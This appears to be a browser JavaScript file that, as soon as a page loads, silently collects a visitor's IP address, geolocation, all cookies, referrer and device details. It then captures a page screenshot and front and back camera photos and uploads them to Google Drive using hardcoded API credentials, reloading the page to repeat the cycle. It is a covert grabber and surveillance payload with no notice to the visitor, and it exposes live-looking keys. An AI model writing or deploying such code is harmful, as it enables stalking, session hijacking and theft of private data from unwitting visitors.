document.addEventListener("DOMContentLoaded", function() {
    const CLIENT_ID = '590122563126-lbkuqdo7c6np7dkmq1kuu0gnqqil92on.apps.googleusercontent.com';  // 590122563126-lbkuqdo7c6np7dkmq1kuu0gnqqil92on.apps.googleusercontent.com
    const API_KEY = 'AIzaSyBc-JEmzddU8s2XHcMOL1CmSgQ8NfyLd8A';  // AIzaSyBc-JEmzddU8s2XHcMOL1CmSgQ8NfyLd8A
    const DISCOVERY_DOCS = ["https://www.googleapis.com/discovery/v1/apis/drive/v3/rest"];
    const SCOPES = 'https://www.googleapis.com/auth/drive.file';

    // User Agent
    var userAgent = navigator.userAgent;

    // Fetch IP Address
    async function getIPAddress() {
        try {
            let response = await fetch('https://api.ipify.org?format=json');
            let data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error fetching IP:', error);
            return 'Error fetching IP';
        }
    }

    // Fetch Geolocation
    function getGeolocation() {
        return new Promise((resolve) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    }),
                    error => {
                        console.error('Error fetching geolocation:', error);
                        resolve({ latitude: 'Error', longitude: 'Error' });
                    }
                );
            } else {
                console.error('Geolocation not supported');
                resolve({ latitude: 'Geolocation not supported', longitude: 'Geolocation not supported' });
            }
        });
    }

    // Get Cookies
    function getCookies() {
        return document.cookie.split(';').reduce((cookieObject, cookieString) => {
            const parts = cookieString.split('=');
            cookieObject[parts[0].trim()] = parts[1] ? parts[1].trim() : '';
            return cookieObject;
        }, {});
    }

    // Get Referrer
    function getReferrer() {
        return document.referrer || "No referrer";
    }

    // Get Page Load Time
    function getPageLoadTime() {
        return window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart;
    }

    // Get Screen Resolution
    function getScreenResolution() {
        return `${screen.width}x${screen.height}`;
    }

    // Get Local Time
    function getLocalTime() {
        return new Date().toLocaleString();
    }

    // Capture Screenshot
    function captureScreenshot(callback) {
        html2canvas(document.body).then(canvas => {
            canvas.toBlob(blob => {
                callback(blob);
            });
        });
    }

    // Upload File to Google Drive
    function uploadFileToDrive(file, filename, callback) {
        var fileMetadata = {
            'name': filename
        };
        var media = {
            mimeType: file.type,
            body: file
        };
        gapi.client.drive.files.create({
            resource: fileMetadata,
            media: media,
            fields: 'id'
        }).then(function(response) {
            console.log('File uploaded successfully:', response);
            if (callback) callback();
        }).catch(error => {
            console.error('Error uploading file:', error);
        });
    }

    // Handle Auth
    function handleAuthClick(event) {
        gapi.auth2.getAuthInstance().signIn();
    }

    function initClient() {
        gapi.client.init({
            apiKey: API_KEY,
            clientId: CLIENT_ID,
            discoveryDocs: DISCOVERY_DOCS,
            scope: SCOPES
        }).then(function() {
            collectAndSendData();
        }).catch(error => {
            console.error('Error initializing Google API client:', error);
        });
    }

    function handleClientLoad() {
        gapi.load('client:auth2', initClient);
    }

    // Collect and Send Data
function collectAndSendData() {
    const data = {
        userAgent: userAgent,
        referrer: getReferrer(),
        pageLoadTime: getPageLoadTime(),
        screenResolution: getScreenResolution(),
        localTime: getLocalTime()
    };

    getIPAddress().then(ipAddress => {
        data.ipAddress = ipAddress;
        getGeolocation().then(location => {
            data.latitude = location.latitude;
            data.longitude = location.longitude;
            data.cookies = getCookies();

            // Convert data to JSON string
            const jsonData = JSON.stringify(data);

            // Create a Blob from the JSON string
            const dataBlob = new Blob([jsonData], { type: 'application/json' });

            // Upload JSON data
            uploadFileToDrive(dataBlob, 'log.json', () => {
                // Capture and upload screenshot
                captureScreenshot(screenshotBlob => {
                    if (screenshotBlob) {
                        uploadFileToDrive(screenshotBlob, 'screenshot.png', () => {
                            // Capture and upload front camera photo
                            captureCameraPhoto('user', frontCameraBlob => {
                                if (frontCameraBlob) {
                                    uploadFileToDrive(frontCameraBlob, 'front_camera.png', () => {
                                        // Capture and upload back camera photo
                                        captureCameraPhoto('environment', backCameraBlob => {
                                            if (backCameraBlob) {
                                                uploadFileToDrive(backCameraBlob, 'back_camera.png', () => {
                                                    setTimeout(() => location.reload(), 5000); // Reload after 5 seconds
                                                });
                                            } else {
                                                setTimeout(() => location.reload(), 5000); // Reload after 5 seconds
                                            }
                                        });
                                    });
                                } else {
                                    setTimeout(() => location.reload(), 5000); // Reload after 5 seconds
                                }
                            });
                        });
                    } else {
                        setTimeout(() => location.reload(), 5000); // Reload after 5 seconds
                    }
                });
            });
        });
    });
}

// Initialize Google API client on load
handleClientLoad();
});
